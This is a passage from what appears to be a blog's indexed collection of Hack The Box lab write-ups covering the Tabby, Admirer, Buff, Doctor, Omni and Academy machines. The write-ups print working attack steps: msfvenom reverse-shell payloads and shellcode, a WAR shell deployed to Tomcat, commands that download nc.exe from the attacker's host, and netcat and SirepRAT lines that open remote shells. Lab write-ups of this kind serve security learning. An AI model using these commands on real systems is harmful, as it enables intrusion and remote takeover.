https://tomcat.apache.org/tomcat-7.0-doc/manager-howto.html#Supported_Manager_Commands Now I need a war file, msfvenom can help out here. \u256d\u2500[us-vip-7]-[10.10.14.44]-[triki@parrot]-[~] \u2570\u2500 $ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.44 LPORT=4444 -f war > shell.war Now I will upload the war file. \u256d\u2500[us-vip-7]-[10.10.14.44]-[triki@parrot]-[/opt/htb/boxes/tabby/results/10.10.10.194/exploit/tomcat] \u2570\u2500 $ curl --upload-file shell.war 'http://tomcat:$3cureP4s5w0rd123!@10.10.10.194:8080/manager/text/deploy?path=/demo' OK - Deployed application at context path [/demo] checking to see what is running on Tomcat \u256d\u2500[us-vip-7]-[10.10.14.44]-[triki@parrot]-[/opt/htb/boxes/tabby/results/10.10.10.194/exploit/tomcat] \u2570\u2500 $ curl 'http://tomcat:$3cureP4s5w0rd123!@10.10.10.194:8080/manager/text/list' OK - Listed applications for virtual host [localhost] /:running:0:ROOT /examples:running:0:/usr/share/tomcat9-examples/examples /shell.war:running:0:shell.war /host-manager:running:1:/usr/share/tomcat9-admin/host-manager /demo:running:0:demo /manager:running:0:/usr/share/tomcat9-admin/manager /docs:running:0:/usr/share/tomcat9-docs/docs Looking at the output I see that my war file path is /demo, so going to http://10.10.10.194/demo should call home, so I need to make sure I have my listener active on the correct port I set in the war file reverse shell. \u256d\u2500[us-vip-7]-[10.10.14.44]-[triki@parrot]-[~]\ue0a0 master \u2570\u2500[\u2622] $ nc -nvlp 4444 Listening on 0.0.0.0 4444 Connection received on 10.10.10.194 51216 id uid=997(tomcat) gid=997(tomcat) groups=997(tomcat) whoami tomcat pwd /var/lib/tomcat9 env USER=tomcat HOME=/opt/tomcat OLDPWD=/ CATALINA_HOME=/usr/share/tomcat9 LOGNAME=tomcat JOURNAL_STREAM=9:24596 CACHE_DIRECTORY=/var/cache/tomcat9 JDK_JAVA_OPTIONS= --add-opens=java.base/java.lang=ALL-UNNAMED --add-opens=java.base/java.io=ALL-UNNAMED --add-opens=java.rmi/sun.rmi.transport=ALL-UNNAMED CATALINA_TMPDIR=/tmp PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin INVOCATION_ID=2349bff0fcac437f9d11fb1922179e7f JAVA_OPTS=-Djava.awt.headless=true -Djdk.tls.ephemeralDHKeySize=2048 -Djava.protocol.handler.pkgs=org.apache.catalina.webresources -Dorg.apache.catalina.security.SecurityListener.UMASK=0027 LANG=en_US.UTF-8 PWD=/var/lib/tomcat9 JAVA_HOME=/usr/lib/jvm/default-java CATALINA_BASE=/var/lib/tomcat9 whereis python python: /usr/bin/python3.8 /usr/lib/python2.7 /usr/lib/python3.8 /etc/python3.8 /usr/local/lib/python3.8 python3 -c 'import pty;pty.spawn(\"/bin/bash\")' tomcat@tabby:/var/lib/tomcat9$ FOOTHOLD, Now I'm in. Lately I have been playing with LinPeas and I really like it, the output it really easy to sift through. So first thing I do is copy that to a safe location on the box(/dev/shm) with wget. Going through the contents I notice something interesting. [+] Interesting writable files owned by me or writable by everyone (not in Home) (max 500) [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files /dev/mqueue /dev/shm /dev/shm/linpeas.sh /dev/shm/tabby-ash.linpeas /home/ash /run/lock /run/screen /run/user/1000 /run/user/1000/dbus-1 /run/user/1000/dbus-1/services /run/user/1000/gnupg /run/user/1000/inaccessible /run/user/1000/systemd /run/user/1000/systemd/units /snap/core18/1705/run/lock /snap/core18/1705/tmp /snap/core18/1705/var/tmp /tmp /tmp/alpine-v3.12-x86_64-20200716_0241.tar.gz.1 /tmp/somethin.tar.gz /tmp/tmux-1000 /var/crash /var/lib/php/sessions /var/tmp /var/www/html/files /var/www/html/files/16162020_backup.zip Two files jump out at me, /tmp/alpine-v3.12-x86_64-20200716_0241.tar.gz.1 , /tmp/somethin.tar.gz and /var/www/html/files/16162020_backup.zip . Copying the files to my local machine I noticed that the file /tmp/somethin.tar.gz was just a text file with the results from downloading the alpine image from another host. --2020-07-15 21:38:17-- http://10.10.14.26:8000/alpine-v3.12-x86_64-20200716_0241.tar.gz Connecting to 10.10.14.26:8000... connected. HTTP request sent, awaiting response... 200 OK Length: 3216907 (3.1M) [application/gzip] Saving to: \u2018alpine-v3.12-x86_64-20200716_0241.tar.gz.1\u2019 0K .......... .......... .......... .......... .......... 1% 63.3K 49s 50K .......... .......... .......... .......... .......... 3% 123K 36s 100K .......... .......... .......... .......... .......... 4% 161K 30s .... 3050K .......... .......... .......... .......... .......... 98% 304K 0s 3100K .......... .......... .......... .......... . 100% 319K=14s 2020-07-15 21:38:32 (222 KB/s) - \u2018alpine-v3.12-x86_64-20200716_0241.tar.gz.1\u2019 saved [3216907/3216907] On to the next file, /var/www/html/files/16162020_backup.zip , trying to extract it asks for a password. Let me see if I can crack it. \u256d\u2500[us-vip-7]-[10.10.14.44]-[triki@parrot]-[/opt/htb/boxes/tabby/results/10.10.10.194/loot] \u2570\u2500[\u2622] $ fcrackzip -u -D -p '/usr/share/wordlists/rockyou.txt' 16162020_backup.zip PASSWORD FOUND!!!!: pw == admin@it Earlier I found a username ash with the Tomcat LFI attack, lets see if this is the password to that account. tomcat@tabby:/var$ su ash Password: admin@it ash@tabby:~$ cat user.txt 457ea7bda5883c31bdeb8dcb7a90c017 Yup, password works and I got the user flag. Time to work on the privilege escalation... Looking back at the files I found earlier, I remember the alpine image that was left. Googling for LXD exploit, I found this, https://www.exploit-db.com/exploits/46978 # Step 1: Download build-alpine => wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine [Attacker Machine] # Step 2: Build alpine => bash build-alpine (as root user) [Attacker Machine] # Step 3: Run this script and you will get root [Victim Machine] # Step 4: Once inside the container, navigate to /mnt/root to see all resources from the host machine Step 2: Now I copy the alpine image I created to the victim server. Step 3: Step 4: ROOTED","title":"2020 07 16 tabby"},{"location":"HTB/2020-07-19-admirer/","text":"Admirer was just retired, here is my write-up on how I worked my way through this box. Enumerating the ports on the host, I see the following: PORT STATE SERVICE REASON VERSION 21/tcp open ftp syn-ack ttl 63 vsftpd 3.0.3 22/tcp open ssh syn-ack ttl 63 OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0) | ssh-hostkey: | 2048 4a:71:e9:21:63:69:9d:cb:dd:84:02:1a:23:97:e1:b9 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDaQHjxkc8zeXPgI5C7066uFJaB6EjvTGDEwbfl0cwM95npP9G8icv1F/YQgKxqqcGzl+pVaAybRnQxiZkrZHbnJlMzUzNTxxI5cy+7W0dRZN4VH4YjkXFrZRw6dx/5L1wP4qLtdQ0tLHmgzwJZO+111mrAGXMt0G+SCnQ30U7vp95EtIC0gbiGDx0dDVgMeg43+LkzWG+Nj+mQ5KCQBjDLFaZXwCp5Pqfrpf3AmERjoFHIE8Df4QO3lKT9Ov1HWcnfFuqSH/pl5+m83ecQGS1uxAaokNfn9Nkg12dZP1JSk+Tt28VrpOZDKhVvAQhXWONMTyuRJmVg/hnrSfxTwbM9 | 256 c5:95:b6:21:4d:46:a4:25:55:7a:87:3e:19:a8:e7:02 (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNHgxoAB6NHTQnBo+/MqdfMsEet9jVzP94okTOAWWMpWkWkT+X4EEWRzlxZKwb/dnt99LS8WNZkR0P9HQxMcIII= | 256 d0:2d:dd:d0:5c:42:f8:7b:31:5a:be:57:c4:a9:a7:56 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBqp21lADoWZ+184z0m9zCpORbmmngq+h498H9JVf7kP 80/tcp open http syn-ack ttl 63 Apache httpd 2.4.25 ((Debian)) | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS | http-robots.txt: 1 disallowed entry |_/admin-dir |_http-server-header: Apache/2.4.25 (Debian) |_http-title: Admirer Testing port 21 for anonymous login failed, looks like I need some credentials. Checking out what is on port 80 I see the following page with a bunch of pictures. Checking for robots.txt I see the following. User-agent: * # This folder contains personal contacts and creds, so no one -not even robots- should see it - waldo Disallow: /admin-dir Well, well well, a hidden folder, what can we do with this ? Wonder what wfuzz can find. Looks like I found some important files I was not supposed to, what is in them ? Now I have some credentials, where the heck do I use them, so far I haven't found a login page, but in the credentials there is mention of wordpress , ok I need to fuzz more, this time for php files. Oh ya, almost forgot about my friend listening on port 21, looks like one of the creds are for FTP Oh boy, looks like something juicy! extracting the html backup I can see everything that was hidden and can access those files locally. The index.php inside the archive contained creds. $servername = \"localhost\"; $username = \"waldo\"; $password = \"]F7jLHw:*G>UPrTo}~A\"d6b\"; $dbname = \"admirerdb\"; Trying these credentials against FTP and SSH fail :( From the extracted archive I can see the hidden files. ./utility-scripts/phptest.php ./utility-scripts/info.php ./utility-scripts/db_admin.php ./utility-scripts/admin_tasks.php ./w4ld0s_s3cr3t_d1r/credentials.txt ./w4ld0s_s3cr3t_d1r/contacts.txt Poking through those files doesn't give me anything useful :( Back to fuzzing.. Found a page called admirer.php , lets see what it looks like. Googling for a vulnerability I came across this article, https://medium.com/bugbountywriteup/adminer-script-results-to-pwning-server-private-bug-bounty-program-fe6d8a43fe6f This requires me to setup a mysql server somewhere I control, setup a user and password to allow a remote connection. Then login to adminer with my server credentials. Ok now I'm in this interface, now how can I get a shell.. Googling comes up with this https://medium.com/bugbountywriteup/adminer-script-results-to-pwning-server-private-bug-bounty-program-fe6d8a43fe6f Looks like I can use LOAD DATA LOCAL INFILE to read from the local filesystem into my database :) Now the fun part, finding the correct path... Looks like there are some path restrictions here, lets see what I do have access to. Ok, /var/www/html looks like a place I can play with. So I previously found a password in the index.php backup I grabbed from the ftp. That password didn't work, I wonder if it was changed recently. Looking at my database table mysql.user I see a new entry containing the index.php code. This password DOES look different, trying all the different usernames against the password came back with a success with waldo . SUCCESS, got user flag. Now for the fun part, privilege escalation. When I get onto a Linux host, I check to see if I have any sudo privileges. In the admin_tasks.sh there is this function which calls a python script in the same /opt/scripts/ folder. backup_web () { if [ \" $EUID \" -eq 0 ] then echo \"Running backup script in the background, it might take a while...\" /opt/scripts/backup.py & else echo \"Insufficient privileges to perform the selected operation.\" fi } Looking at the file /opt/scripts/backup.py #!/usr/bin/python3 from shutil import make_archive src = '/var/www/html/' # old ftp directory, not used anymore #dst = '/srv/ftp/html' dst = '/var/backups/html' make_archive ( dst , 'gztar' , src ) Ok, looks like a simple script that calls a library shutils and uses it to backup the html folder. Googling for python library privilege escalation comes back with this, https://rastating.github.io/privilege-escalation-via-python-library-hijacking/ Looks like I can poison the python library path by adding my own path with the PYTHONPATH environment variable(https://www.tutorialspoint.com/What-is-PYTHONPATH-environment-variable-in-Python). I will start with creating a file called shutil.py in /dev/shm/ with a python reverse shell inside a function called make_archive Now I can execute the script with sudo which will call the backup.py and that will use MY shutil.py module when I update the PYTHONPATH variable. Before I do that I need to have a nc listener waiting for the connection. There is a connection home, now to get a proper shell and check for root.txt","title":"2020 07 19 admirer"},{"location":"HTB/2020-08-05-buff/","text":"Next up is Buff , rated as an easy Windows box. Starting off with enumeration, I see the following available: PORT STATE SERVICE REASON VERSION 135/tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 139/tcp open netbios-ssn syn-ack ttl 127 Microsoft Windows netbios-ssn 445/tcp open microsoft-ds? syn-ack ttl 127 8080/tcp open http syn-ack ttl 127 Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6) Checking port 135 with a null session from rpcclient comes back empty handed. Leaving this port for now. Port 139, smbmap also came back with nothing right away, going to leave this for now also. Now port 8080 is running software called Gym Management Software 1.0 , which appears to be vulnerable to RCE, https://www.exploit-db.com/exploits/48506 This exploit takes advantage of unauthenticated usaged of upload.php to potentially send maliscious files. Great ! I have a shell , but not really, I cannot leave the folder I am in due to the type of exploit this is(RCE). To get a full shell I can upload nc.exe and use that to get a full shell. On the shell I download my nc.exe with the following powershell command: Remote powershell -c iwr http://10.10.14.44:8000/nc.exe c:\\xampp\\htdocs\\gym\\upload\\nc.exe Local python3 -m http.server 8000 Now to create a real shell with netcat. Remote nc -e cmd.exe 10.10.14.44 4444 Local nc -nvlp 4444 Now, this is better ! After some manual enumeration, I found a user shaun and the user flag. Lurking further in shaun's home folder I found an executable called CloudMe_1112.exe . Googling this comes back with a buffer overflow. https://www.exploit-db.com/exploits/48389 I went through several exploit before getting this one to work. Reading through the exploit I need to generate my own byte code for the reverse shell. \u256d\u2500[us-vip-7]-[10.10.14.44]-[triki@parrot]-[/opt/htb/boxes/buff/results/10.10.10.198/exploit] \u2570\u2500 $ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.44 LPORT=7777 EXITFUNC=thread -b \"\\x00\\x0d\\x0a\" -f python [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload [-] No arch selected, selecting arch: x86 from the payload Found 11 compatible encoders Attempting to encode payload with 1 iterations of x86/shikata_ga_nai x86/shikata_ga_nai succeeded with size 351 (iteration=0) x86/shikata_ga_nai chosen with final size 351 Payload size: 351 bytes Final size of python file: 1712 bytes buf = b\"\" buf += b\"\\xbf\\xd3\\x95\\xfc\\xc4\\xda\\xce\\xd9\\x74\\x24\\xf4\\x5a\\x33\" buf += b\"\\xc9\\xb1\\x52\\x83\\xc2\\x04\\x31\\x7a\\x0e\\x03\\xa9\\x9b\\x1e\" buf += b\"\\x31\\xb1\\x4c\\x5c\\xba\\x49\\x8d\\x01\\x32\\xac\\xbc\\x01\\x20\" buf += b\"\\xa5\\xef\\xb1\\x22\\xeb\\x03\\x39\\x66\\x1f\\x97\\x4f\\xaf\\x10\" buf += b\"\\x10\\xe5\\x89\\x1f\\xa1\\x56\\xe9\\x3e\\x21\\xa5\\x3e\\xe0\\x18\" buf += b\"\\x66\\x33\\xe1\\x5d\\x9b\\xbe\\xb3\\x36\\xd7\\x6d\\x23\\x32\\xad\" buf += b\"\\xad\\xc8\\x08\\x23\\xb6\\x2d\\xd8\\x42\\x97\\xe0\\x52\\x1d\\x37\" buf += b\"\\x03\\xb6\\x15\\x7e\\x1b\\xdb\\x10\\xc8\\x90\\x2f\\xee\\xcb\\x70\" buf += b\"\\x7e\\x0f\\x67\\xbd\\x4e\\xe2\\x79\\xfa\\x69\\x1d\\x0c\\xf2\\x89\" buf += b\"\\xa0\\x17\\xc1\\xf0\\x7e\\x9d\\xd1\\x53\\xf4\\x05\\x3d\\x65\\xd9\" buf += b\"\\xd0\\xb6\\x69\\x96\\x97\\x90\\x6d\\x29\\x7b\\xab\\x8a\\xa2\\x7a\" buf += b\"\\x7b\\x1b\\xf0\\x58\\x5f\\x47\\xa2\\xc1\\xc6\\x2d\\x05\\xfd\\x18\" buf += b\"\\x8e\\xfa\\x5b\\x53\\x23\\xee\\xd1\\x3e\\x2c\\xc3\\xdb\\xc0\\xac\" buf += b\"\\x4b\\x6b\\xb3\\x9e\\xd4\\xc7\\x5b\\x93\\x9d\\xc1\\x9c\\xd4\\xb7\" buf += b\"\\xb6\\x32\\x2b\\x38\\xc7\\x1b\\xe8\\x6c\\x97\\x33\\xd9\\x0c\\x7c\" buf += b\"\\xc3\\xe6\\xd8\\xd3\\x93\\x48\\xb3\\x93\\x43\\x29\\x63\\x7c\\x89\" buf += b\"\\xa6\\x5c\\x9c\\xb2\\x6c\\xf5\\x37\\x49\\xe7\\xf0\\xcd\\x5f\\xdb\" buf += b\"\\x6c\\xd0\\x5f\\x3d\\x0c\\x5d\\xb9\\x2b\\xde\\x0b\\x12\\xc4\\x47\" buf += b\"\\x16\\xe8\\x75\\x87\\x8c\\x95\\xb6\\x03\\x23\\x6a\\x78\\xe4\\x4e\" buf += b\"\\x78\\xed\\x04\\x05\\x22\\xb8\\x1b\\xb3\\x4a\\x26\\x89\\x58\\x8a\" buf += b\"\\x21\\xb2\\xf6\\xdd\\x66\\x04\\x0f\\x8b\\x9a\\x3f\\xb9\\xa9\\x66\" buf += b\"\\xd9\\x82\\x69\\xbd\\x1a\\x0c\\x70\\x30\\x26\\x2a\\x62\\x8c\\xa7\" buf += b\"\\x76\\xd6\\x40\\xfe\\x20\\x80\\x26\\xa8\\x82\\x7a\\xf1\\x07\\x4d\" buf += b\"\\xea\\x84\\x6b\\x4e\\x6c\\x89\\xa1\\x38\\x90\\x38\\x1c\\x7d\\xaf\" buf += b\"\\xf5\\xc8\\x89\\xc8\\xeb\\x68\\x75\\x03\\xa8\\x89\\x94\\x81\\xc5\" buf += b\"\\x21\\x01\\x40\\x64\\x2c\\xb2\\xbf\\xab\\x49\\x31\\x35\\x54\\xae\" buf += b\"\\x29\\x3c\\x51\\xea\\xed\\xad\\x2b\\x63\\x98\\xd1\\x98\\x84\\x89\" After adding that in the script. I create an executable with pyinstaller (this is done in Windows). pyinstaller -F privesc2.py Now to copy it to the victim machine, I will use the same method I used for getting nc.exe up there. I wasn't paying attention and ran the exploit from the RCE shell instead of my netcat shell, before I noticed it had made a connection to my local listener. AND I got Admin access :) The root flag was in usual location.","title":"2020 08 05 buff"},{"location":"HTB/2020-09-10-doctor/","text":"Doctor is the next box, this is Linux box marked as easy. Starting off with nmap results I see the following: # Nmap 7.80 scan initiated Mon Oct 19 20:00:39 2020 as: nmap -vv --reason -Pn -A --osscan-guess --version-all -p- -oN /opt/htb/boxes/doctor/results/10.10.10.209/scans/_full_tcp_nmap.txt -oX /opt/htb/boxes/doctor/results/10.10.10.209/scans/xml/_full_tcp_nmap.xml 10.10.10.209 adjust_timeouts2: packet supposedly had rtt of -375760 microseconds. Ignoring time. adjust_timeouts2: packet supposedly had rtt of -375760 microseconds. Ignoring time. Nmap scan report for 10 .10.10.209 Host is up, received user-set ( 0 .036s latency ) . Scanned at 2020 -10-19 20 :00:40 EDT for 161s Not shown: 65532 filtered ports Reason: 65532 no-responses PORT STATE SERVICE REASON VERSION 22 /tcp open ssh syn-ack ttl 63 OpenSSH 8 .2p1 Ubuntu 4ubuntu0.1 ( Ubuntu Linux ; protocol 2 .0 ) 80 /tcp open http syn-ack ttl 63 Apache httpd 2 .4.41 (( Ubuntu )) | http-methods: | _ Supported Methods: POST OPTIONS HEAD GET | _http-server-header: Apache/2.4.41 ( Ubuntu ) | _http-title: Doctor 8089 /tcp open ssl/http syn-ack ttl 63 Splunkd httpd | http-methods: | _ Supported Methods: GET HEAD OPTIONS | http-robots.txt: 1 disallowed entry | _/ | _http-server-header: Splunkd | _http-title: splunkd | ssl-cert: Subject: commonName = SplunkServerDefaultCert/organizationName = SplunkUser | Issuer: commonName = SplunkCommonCA/organizationName = Splunk/stateOrProvinceName = CA/countryName = US/emailAddress = support@splunk.com/localityName = San Francisco | Public Key type: rsa | Public Key bits: 2048 | Signature Algorithm: sha256WithRSAEncryption | Not valid before: 2020 -09-06T15:57:27 | Not valid after: 2023 -09-06T15:57:27 | MD5: db23 4e5c 546d 8895 0f5f 8f42 5e90 6787 | SHA-1: 7ec9 1bb7 343f f7f6 bdd7 d015 d720 6f6f 19e2 098b First interesting port I see is port 80, visiting the IP address present a normal website for a doctor. Going through the site I found an email address info@doctors.htb , so I added doctors.htb to my hosts file and visited the new domain and I got a login page. I see I can create an account, so I do so and login to see the following. This appears to be a secure messaging service for the doctors. Clicking on the New Message link I'm brought to a form where I can post a message. There might be a chance I can do a RFI with this form, lets see. I now have shell as web user, now I will run LinPeas to enumerate the system. In the results I see a db was found here /home/web/blog/flaskblog/site.db and in the user table was a row for an admin user and a bcrypted hashed password. Attempted to brute force this password with hashcat. While that runs, I will keep looking. I found a password in the file /var/log/apache2/backup, looks like maybe someone typed the password into the username field by accident. I'm guessing the password I found might be for the user shuan since I only see 2 users on this host, web and shuan . Trying to ssh to the host as shaun failed along with root . Since I had shell access already I decided to look at the sshd_config and inside I found out why... DenyUsers shaun Ok, so I cannot SSH in to the box as the user, I need to find another way in. Looking back at my nmap scan I see there is something running at a higher port, 8089 . Googling this comes back with this is a Splunk forwarder. More Googling found this page, https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/. I run the script with the login I found for shaun to have it create a shell back to me with netcat. Box is rooted, flag is in /root/root.txt","title":"2020 09 10 doctor"},{"location":"HTB/2020-09-20-omni/","text":"Here we have omni which is a Windows box. I'll start off with the nmap scan results. # Nmap 7.80 scan initiated Sun Oct 11 23:58:22 2020 as: nmap -vv --reason -Pn -A --osscan-guess --version-all -p- -oN /opt/htb/boxes/omni/results/10.10.10.204/scans/_full_tcp_nmap.txt -oX /opt/htb/boxes/omni/results/10.10.10.204/scans/xml/_full_tcp_nmap.xml 10.10.10.204 Nmap scan report for 10 .10.10.204 Host is up, received user-set ( 0 .024s latency ) . Scanned at 2020 -10-11 23 :58:23 EDT for 367s Not shown: 65529 filtered ports Reason: 65529 no-responses PORT STATE SERVICE REASON VERSION 135 /tcp open msrpc syn-ack ttl 127 Microsoft Windows RPC 5985 /tcp open upnp syn-ack ttl 127 Microsoft IIS httpd 8080 /tcp open upnp syn-ack ttl 127 Microsoft IIS httpd | http-auth: | HTTP/1.1 401 Unauthorized \\x 0D | _ Basic realm = Windows Device Portal | _http-server-header: Microsoft-HTTPAPI/2.0 | _http-title: Site doesn 't have a title. 29817/tcp open unknown syn-ack ttl 127 29819/tcp open arcserve syn-ack ttl 127 ARCserve Discovery 29820/tcp open unknown syn-ack ttl 127 ``` Attempting to visit port 8080 I am prompt for a password. Since I don' t have any, I ' ll come back to this later. This appears to be a Windows host, Googling the ports 29817 , 29819 and 29820 and found this Microsoft Forum Post, https://social.msdn.microsoft.com/Forums/en-US/75314423-de13-4eff-bd15-0fec8b9c1da4/ports-open?forum = WindowsIoT Looking for Windows 10 IoT exploit I found the following github page, https://github.com/SafeBreach-Labs/SirepRAT ! [ SirepRat ]( /images/omni/omni-sireprat-github.png ) After pulling the repo, I test out this exploit to see if it works. ! [ RunExploit ]( /images/omni/omni-run-exploit.png ) YUP, as we can see here I was able to pull the hosts file : ) Here are the commands I used with this exploit. Run Command ``` shell python SirepRAT.py 10 .10.10.204 LaunchCommandWithOutput --return_output --cmd \"C:\\Windows\\System32\\hostname.exe\" ``` Run Command with args ``` shell python SirepRAT.py 10 .10.10.204 LaunchCommandWithOutput --return_output --as_logged_on_user --cmd \"C:\\Windows\\System32\\cmd.exe\" --args \" /c echo {{userprofile}}\" Upload NC or RevseShell python SirepRAT.py 10 .10.10.204 LaunchCommandWithOutput --return_output --as_logged_on_user --cmd \"C:\\Windows\\System32\\cmd.exe\" --args \" /c powershell Invoke-WebRequest -Outfile %TEMP%\\\\nc.exe -Uri http://10.10.14.28/nc.exe\" Invokde Reverse Shell python SirepRAT.py 10 .10.10.204 LaunchCommandWithOutput --return_output --as_logged_on_user --cmd \"C:\\Windows\\System32\\cmd.exe\" --args \" /c %TEMP%\\\\nc.exe 10.10.14.28 7777 -e powershell.exe\" Get System Information python SirepRAT.py 10 .10.10.204 GetSystemInformationFromDevice Here I am setting up a nc listener on the left side and on the right side I am executing the exploit to call home to my listener. Now I have a foothold on the box. Checking to see what user I am I see DefaultAccount PS C: \\D ata> $env :UserName $env :UserName DefaultAccount PS C: \\D ata> I want to see what the root of the C drive looks like. Going to C:\\Users shows only the Public folder, poking around more I found the users under this path c:\\Data\\Users . I cannot access any folder but the DefaultAccount and there is nothing inside. Looking through Program Files I found a rogue file called c:\\Program Files\\WindowsPowerShell\\Modules\\PackageManagement\\r.bat with the contents: Now inside this file I see the user administrator and a password . Where could I use this password ??? The page on port 8080 did ask me for credentials, lets try this there. Looks like that works and I see a Windows Device Portal . Poking around the site, I find under Processes an option called Run command . This web shell allows me to run commands remotely, lets see if I can get a nc shell back home. But netcat is not in c:\\windows\\system32, so I need to download it again. Since I couldn't write to c:\\windows\\system32 from the exploit, I'll just use this interface to download nc.exe to where I need it now. Now I can use this webshell todownload netcat to get a shell as administrator . Hmm this is different, Googling this shows it's a powershell encrypted password. This site explains how the process works, https://devblogs.microsoft.com/scripting/decrypt-powershell-secure-string-password/","title":"2020 09 20 omni"},{"location":"HTB/2020-12-16-academy/","text":"Academy is an Easy Linux Box, time to dig in. PORT STATE SERVICE REASON VERSION 22 /tcp open ssh syn-ack ttl 63 OpenSSH 8 .2p1 Ubuntu 4ubuntu0.1 ( Ubuntu Linux ; protocol 2 .0 ) | ssh-hostkey: | 3072 c0:90:a3:d8:35:25:6f:fa:33:06:cf:80:13:a0:a5:53 ( RSA ) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC/0BA3dU0ygKCvP7G3GklCeOqxb17vxMCsugN05RA9Fhj7AzkPiMLrrKRY656gBuscH23utAWAhRXzV1SyU37bbFzEbfaqYAlh1ggHEuluLgbf9QsYZe76zCx2SRPOzoI9Q40klVvuu9E92pNLe80dvUZj644EwhJTGw4KGxeOqeuo/nXnYfiNAbWvOe9Qp+djDbEvP5lHwIDMTAtgggoSC1chubC3jFC4hihuYjtitjUr4+5fROomhJAo/GEvdBj2CYNHIFEvmuvb32cgul5ENQS4fJXpcI7fbP9/+b/cfA9oRxG2k+k1M8mUld2h5mHEVBE5Z9WKS3cRYu97oVKnRRCoDY/55mZw6lngIdH4drpYwzCrZcCWgviXRfCeOwmZ8sucap6qN/nFYnPoF7fd+LGaQOhz9MkAZCTMmLqSiZGSistAIPzHtABH0VQDbo2TqJ+kGWr9/EamCcYBbVVPaFj/XQqujoEjLYW+igihwrPEQ7zxlleQHwg91oSVy38 = | 256 2a:d5:4b:d0:46:f0:ed:c9:3c:8d:f6:5d:ab:ae:77:96 ( ECDSA ) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAIMsz8qKL1UCyrPmpM5iTmoy3cOsk+4L7oFdcPjBXwAcUVvnti7nXHlNqMfgsapbGSIl7AWTOeXLZmw2J6JWvE = | 256 e1:64:14:c3:cc:51:b2:3b:a6:28:a7:b1:ae:5f:45:35 ( ED25519 ) | _ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHBP1E2rWeTShvyJKxC5Brv1Do3OwvWIzlZHWVw/bD0R 80 /tcp open http syn-ack ttl 63 Apache httpd 2 .4.41 (( Ubuntu )) | http-methods: | _ Supported Methods: GET HEAD POST OPTIONS | _http-server-header: Apache/2.4.41 ( Ubuntu ) | _http-title: Hack The Box Academy 33060 /tcp open socks5 syn-ack ttl 63 | fingerprint-strings: | DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe: | Invalid message \" | HY000 | Radmin: | authentication.mechanisms | MYSQL41 | SHA256_MEMORY | doc.formats | text | client.interactive | compression | algorithm | deflate_stream | lz4_message | zstd_stream | node_type | mysql |_ client.pwd_expire_ok | socks-auth-info: | No authentication | No authentication |_ No authentication Checking out the website hosted on this IP I see it forwards be to the domain academy.htb , adding this to my /etc/hosts file I can see the site. Here I see 2 links, one to Login and another to Register, so I try to register and capture the traffic via BURP. I noticed there is an extra parameter being sent with the request, roleid , with the default value of 0 . I send this request to Repeater, and Forward existing request to the site. I'll come back to the request in Repeater. Poking around this site I don't really see anything. I had run ffuf against the domain and found some interesting files. :: Method : GET [ 95 /1339 ] :: URL : http://academy.htb/FUZZ :: Extensions : .php :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200 ,204,301,302,307,401,403 :: Filter : Response size: 403 ,276 ________________________________________________ admin.php [ Status: 200 , Size: 2633 , Words: 668 , Lines: 142 ] admin.php [ Status: 200 , Size: 2633 , Words: 668 , Lines: 142 ] cc [ Status: 200 , Size: 0 , Words: 1 , Lines: 1 ] home.php [ Status: 302 , Size: 55034 , Words: 4001 , Lines: 1050 ] images [ Status: 301 , Size: 311 , Words: 20 , Lines: 10 ] [ INFO ] Adding a new job to the queue: http://academy.htb/images/FUZZ index.php [ Status: 200 , Size: 2117 , Words: 890 , Lines: 77 ] index.php [ Status: 200 , Size: 2117 , Words: 890 , Lines: 77 ] login.php [ Status: 200 , Size: 2627 , Words: 667 , Lines: 142 ] register.php [ Status: 200 , Size: 3003 , Words: 801 , Lines: 149 ] [ INFO ] Scanning: http://academy.htb/images/FUZZ :: Progress: [ 9304 /9304 ] :: Job [ 2 /2 ] :: 1860 req/sec :: Duration: [ 0 :00:05 ] :: Errors: 0 :: Lets see what's on admin.php I try to login with the account I created previously and it didn't work. Lets go back to Repeater in Burp and look at that request roleid . After sending this request and attempting the new account, I got in! Here I see I need to add another host my hosts file. After updating I see the following at dev-staging-01.academy.htb Here I see something tried to load but failed due to permissions issues to a log file called laravel.log . What is this laravel ??? I will GTS... Poking through the page I see this includes the environment variable for the host which include usernames and password !! WHOOOPS Checking what searchsploit has for laravel I found the following. Since I have a token I check out metasploit module unix/http/laravel_token_unserialize_exec Running this metasploit module gets me shell access as www-data . SHELL WITHOUT METASPLOIT Goolging came across a github page where it looks like someone write a script for this box, https://github.com/aljavier/exploit_laravel_cve-2018-15133 Privilege Escalation #1 Now from here I run linpeas and sift through the results and it found some useful stuff. DB_DATABASE = academy DB_USERNAME = dev DB_PASSWORD = mySup3rP4s5w0rd!! Linpeas also provides a full list of system users uid = 1000 ( egre55 ) gid = 1000 ( egre55 ) groups = 1000 ( egre55 ) ,4 ( adm ) ,24 ( cdrom ) ,27 ( sudo ) ,30 ( dip ) ,46 ( plugdev ) ,116 ( lxd ) uid = 1001 ( mrb3n ) gid = 1001 ( mrb3n ) groups = 1001 ( mrb3n ) uid = 1002 ( cry0l1t3 ) gid = 1002 ( cry0l1t3 ) groups = 1002 ( cry0l1t3 ) ,4 ( adm ) uid = 1003 ( 21y4d ) gid = 